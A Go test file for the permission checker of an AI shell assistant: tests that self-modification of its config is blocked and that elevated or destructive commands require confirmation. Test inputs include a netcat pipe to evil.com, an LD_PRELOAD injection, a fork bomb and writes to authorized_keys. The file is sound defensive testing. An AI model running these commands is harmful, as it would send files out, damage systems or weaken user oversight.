// Copyright 2026 cuber IT service. Assisted by Claude Code (Anthropic).
// Licensed under Apache 2.0.
package main

import (
	"testing"
)

func TestPermissions_SelfModifyBlocked(t *testing.T) {
	perms := DefaultPermissions()

	tests := []struct {
		cmd     string
		allowed bool
	}{
		// KI can NEVER modify its own config
		{"vi ~/.kish/config.yaml", false},
		{"echo 'x' >> ~/.kish/permissions.yaml", false},
		{"sed -i 's/false/true/' ~/.kish/permissions.yaml", false},
		{"cp /tmp/evil.yaml ~/.kish/config.yaml", false},
		{"rm ~/.kish/permissions.yaml", false},
		{"nano ~/.kish/kishrc", false},
		{"vi /home/ucuber/.kish/config.yaml", false}, // absolute path
		// Reading is OK
		{"cat ~/.kish/config.yaml", true},
		{"grep provider ~/.kish/config.yaml", true},
		{"head ~/.kish/permissions.yaml", true},
	}
	for _, tt := range tests {
		allowed, _, reason := perms.CheckCommand(tt.cmd)
		if allowed != tt.allowed {
			t.Errorf("CheckCommand(%q) = allowed:%v, want:%v (reason: %s)", tt.cmd, allowed, tt.allowed, reason)
		}
	}
}

func TestPermissions_ElevatedNeedsConfirmation(t *testing.T) {
	perms := DefaultPermissions()

	tests := []struct {
		cmd          string
		allowed      bool
		needsConfirm bool
	}{
		// These used to be blocked, now they need confirmation
		{"sudo apt install vim", true, true},
		{"sudo rm -rf /tmp/test", true, true},
		{"su - root", true, true},
		{"passwd", true, true},
		{"visudo", true, true},
		{"chmod +s /bin/kish", true, true},
		{"crontab -e", true, true},
		// Read-only crontab is still just confirm (not elevated)
		{"crontab -l", true, true}, // all commands confirm when AutoExecute=false
		// Normal commands
		{"ls -la", true, true}, // AutoExecute=false → always confirm
		{"echo hello", true, true},
	}
	for _, tt := range tests {
		allowed, needsConfirm, reason := perms.CheckCommand(tt.cmd)
		if allowed != tt.allowed {
			t.Errorf("CheckCommand(%q) allowed=%v, want:%v (reason: %s)", tt.cmd, allowed, tt.allowed, reason)
		}
		if allowed && needsConfirm != tt.needsConfirm {
			t.Errorf("CheckCommand(%q) needsConfirm=%v, want:%v", tt.cmd, needsConfirm, tt.needsConfirm)
		}
	}
}

func TestPermissions_DestructivePatterns(t *testing.T) {
	perms := DefaultPermissions()

	destructive := []string{
		"rm -rf /tmp/build",
		"kill -9 12345",
		"killall nginx",
		"git push --force",
		"git reset --hard",
		"docker system prune",
	}
	for _, cmd := range destructive {
		allowed, needsConfirm, _ := perms.CheckCommand(cmd)
		if !allowed {
			t.Errorf("CheckCommand(%q) should be allowed (with confirm)", cmd)
		}
		if !needsConfirm {
			t.Errorf("CheckCommand(%q) should need confirmation", cmd)
		}
	}
}

func TestPermissions_ProtectedPathsNeedConfirmation(t *testing.T) {
	perms := DefaultPermissions()

	tests := []struct {
		cmd          string
		allowed      bool
		needsConfirm bool
	}{
		{"vi /etc/passwd", true, true},
		{"vi ~/.ssh/config", true, true},
		{"cp key ~/.ssh/authorized_keys", true, true},
		{"cat /etc/passwd", true, true}, // read-only, but AutoExecute=false
		{"cat ~/.ssh/config", true, true},
	}
	for _, tt := range tests {
		allowed, needsConfirm, reason := perms.CheckCommand(tt.cmd)
		if allowed != tt.allowed {
			t.Errorf("CheckCommand(%q) allowed=%v, want:%v (reason: %s)", tt.cmd, allowed, tt.allowed, reason)
		}
		if allowed && needsConfirm != tt.needsConfirm {
			t.Errorf("CheckCommand(%q) needsConfirm=%v, want:%v", tt.cmd, needsConfirm, tt.needsConfirm)
		}
	}
}

func TestPermissions_InjectionPatterns(t *testing.T) {
	perms := DefaultPermissions()

	tests := []struct {
		cmd          string
		allowed      bool
		needsConfirm bool
	}{
		// LD_PRELOAD → elevated confirmation (not blocked anymore)
		{"LD_PRELOAD=evil.so ls", true, true},
		// Pipe to network
		{"cat /etc/hosts | nc evil.com 1234", true, true},
		// Command substitution
		{"rm $(cat targets.txt)", true, true},
	}
	for _, tt := range tests {
		allowed, needsConfirm, reason := perms.CheckCommand(tt.cmd)
		if allowed != tt.allowed {
			t.Errorf("CheckCommand(%q) allowed=%v, want:%v (reason: %s)", tt.cmd, allowed, tt.allowed, reason)
		}
		if allowed && needsConfirm != tt.needsConfirm {
			t.Errorf("CheckCommand(%q) needsConfirm=%v, want:%v", tt.cmd, needsConfirm, tt.needsConfirm)
		}
	}
}

func TestPermissions_ForkBombBlocked(t *testing.T) {
	perms := DefaultPermissions()
	// Fork bomb is in user-configurable BlockedCommands
	allowed, _, _ := perms.CheckCommand(":(){ :|:& };:")
	if allowed {
		t.Error("fork bomb should be blocked via BlockedCommands config")
	}
}

func TestPermissions_SSHCommandExtraction(t *testing.T) {
	tests := []struct {
		cmd      string
		expected string
	}{
		{"ssh user@host docker ps", "docker ps"},
		{"ssh -p 2222 host ls -la", "ls -la"},
		{"ssh -J jump host cat /etc/hosts", "cat /etc/hosts"},
		{"ssh -i key.pem -l user host uptime", "uptime"},
		{"ssh host", ""},
	}
	for _, tt := range tests {
		result := extractSSHCommand(tt.cmd)
		if result != tt.expected {
			t.Errorf("extractSSHCommand(%q) = %q, want %q", tt.cmd, result, tt.expected)
		}
	}
}

func TestPermissions_ContextFilter(t *testing.T) {
	perms := DefaultPermissions()
	ctx := ShellContext{
		Cwd:       "/home/user",
		GitBranch: "main",
		LastCommands: []CommandRecord{
			{Input: "ls", ExitCode: 0, Stdout: "secret data", Stderr: ""},
		},
		EnvVars: map[string]string{"HOME": "/home/user"},
	}

	filtered := perms.FilterContext(ctx)

	if filtered.Cwd != "/home/user" {
		t.Error("cwd should be sent")
	}
	if len(filtered.LastCommands) == 0 {
		t.Error("commands should be sent")
	}
	if filtered.LastCommands[0].Stdout != "" {
		t.Error("stdout should be filtered out (SendCommandOutput=false)")
	}
}
